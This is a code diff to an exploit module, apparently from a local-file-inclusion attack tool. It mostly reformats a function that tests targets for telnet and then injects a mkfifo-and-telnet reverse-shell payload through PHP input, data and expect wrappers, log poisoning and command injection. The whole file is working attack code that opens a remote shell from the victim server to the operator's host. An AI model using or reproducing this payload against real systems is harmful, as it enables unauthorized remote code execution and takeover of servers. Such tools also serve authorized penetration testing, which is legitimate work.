@@ -1,7 +1,7 @@
+"""Telnet"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
@@ -9,14 +9,12 @@ from src.utils import colors
 
 
 def exploit_telnet(exploit, method, ip, port):
-
+    """Exploit telnet"""
     url = exploit["GETVAL"]
     post = exploit["POSTVAL"]
 
     telnetTest = "which%20telnet"
-    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(
-        ip, str(port)
-    )
+    telnetPayload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{ip}+{port}+>/tmp/f"
 
     print(
         colors.purple("[.]")
@@ -32,6 +30,7 @@ def exploit_telnet(exploit, method, ip, port):
             "",
             "",
         )
+
         if "/bin" in res.text and "/telnet" in res.text:
             u = url.replace(config.tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "input wrapper")
@@ -39,6 +38,7 @@ def exploit_telnet(exploit, method, ip, port):
                 u, args.httpheaders, exploit["POSTVAL"], config.proxies, "", ""
             )
             return True
+
     if method == "DATA":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -58,6 +58,7 @@ def exploit_telnet(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/telnet" in res.text:
             u = url.replace(config.tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "data wrapper")
@@ -73,6 +74,7 @@ def exploit_telnet(exploit, method, ip, port):
             else:
                 request.REQUEST(u, args.httpheaders, "", config.proxies, "", "")
             return True
+
     if method == "EXPECT":
         if args.postreq:
             res, _ = request.REQUEST(
@@ -92,6 +94,7 @@ def exploit_telnet(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/telnet" in res.text:
             u = url.replace(config.tempArg, encode(telnetPayload))
             printInfo(ip, port, "telnet", "expect wrapper")
@@ -107,6 +110,7 @@ def exploit_telnet(exploit, method, ip, port):
             else:
                 request.REQUEST(u, args.httpheaders, "", config.proxies, "", "")
             return True
+
     if method == "TRUNC":
         exploit_log_poison(
             ip,
@@ -139,6 +143,7 @@ def exploit_telnet(exploit, method, ip, port):
                 "",
                 "",
             )
+
         if "/bin" in res.text and "/telnet" in res.text:
             printInfo(ip, port, "telnet", "command injection")
             if args.postreq:
